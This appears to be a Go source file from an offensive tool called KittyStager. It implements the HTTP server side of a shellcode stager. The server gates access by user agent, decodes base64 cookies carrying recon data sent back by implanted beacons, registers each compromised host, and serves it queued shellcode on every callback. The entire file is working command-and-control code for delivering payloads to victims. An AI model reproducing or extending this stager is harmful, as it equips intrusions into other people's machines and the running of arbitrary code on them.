package http

import (
	"KittyStager/cmd/config"
	"KittyStager/cmd/util"
	b64 "encoding/base64"
	"fmt"
	color "github.com/logrusorgru/aurora"
	"net/http"
)

type kitten struct {
	name       string
	Shellcode  []byte
	id         int
	InitChecks util.InitialChecks
}

var (
	userA   string
	Targets map[string]*kitten
)

func (K *kitten) GetTarget() string {
	return K.name
}

func (K *kitten) GetShellcode() []byte {
	return K.Shellcode
}

func (K *kitten) GetId() int {
	return K.id
}

func (K *kitten) GetInitChecks() util.InitialChecks {
	return K.InitChecks
}

func CreateHttpServer(conf config.General) {
	Targets = map[string]*kitten{"all targets": {
		name:      "all targets",
		Shellcode: []byte(fmt.Sprintf("%d", conf.GetSleep())),
		id:        len(Targets),
	}}
	address := fmt.Sprintf("%s:%d", conf.GetHost(), conf.GetPort())
	userA = conf.GetUserAgent()
	fmt.Printf("%s %s\n\n", color.Green("[+] Started http server on"), color.Yellow(address))
	http.HandleFunc(conf.GetEndpoint(), logRequest)
	err := http.ListenAndServe(address, nil)
	if err != nil {
		util.ErrPrint(err)
		return
	}
}

// Logs the requests from the beacons
func logRequest(w http.ResponseWriter, r *http.Request) {
	var c util.InitialChecks
	userAgent := r.UserAgent()
	//check if the user agent is correct
	if userAgent != userA {
		w.WriteHeader(404)
		fmt.Printf("\n%s\n", color.Yellow("[!] Unauthorized user agent: "+userAgent))
		return
	}
	cookie := r.Header.Get("Cookie")
	//check if the cookie is initial callback
	if len(cookie) > 50 {
		out, err := b64.StdEncoding.DecodeString(cookie)
		if err != nil {
			util.ErrPrint(err)
			return
		}
		c, err = util.UnmarshalJSON(out)

		//If the beacon is not in the map, add it
		fmt.Printf("\n%s %s\n", color.Green("[+] Request from:"), color.Yellow(c.GetIp()))
		fmt.Printf("%s %s\n", color.Green("[+] Kitten name:"), color.Yellow(c.GetKittenName()))
		fmt.Printf("%s %s\n", color.Green("[+] User-Agent:"), color.Yellow(r.UserAgent()))
		//Get recon data

		Targets[c.KittenName] = &kitten{
			name:       c.KittenName,
			id:         len(Targets),
			Shellcode:  Targets["all targets"].GetShellcode(), //Set the shellcode to the default sleep time
			InitChecks: c,
		}

		_, err = w.Write(Targets[c.KittenName].GetShellcode())
		if err != nil {
			return
		}
		err = util.PrintCookie(out)
		if err != nil {
			fmt.Println(color.Red("Error printing cookie"))
			return
		}
		// regular callback
	} else {
		kittenName := cookie
		if _, ok := Targets[kittenName]; ok {
			_, err := w.Write(Targets[kittenName].GetShellcode())
			if err != nil {
				return
			}
			return
		}
	}
}
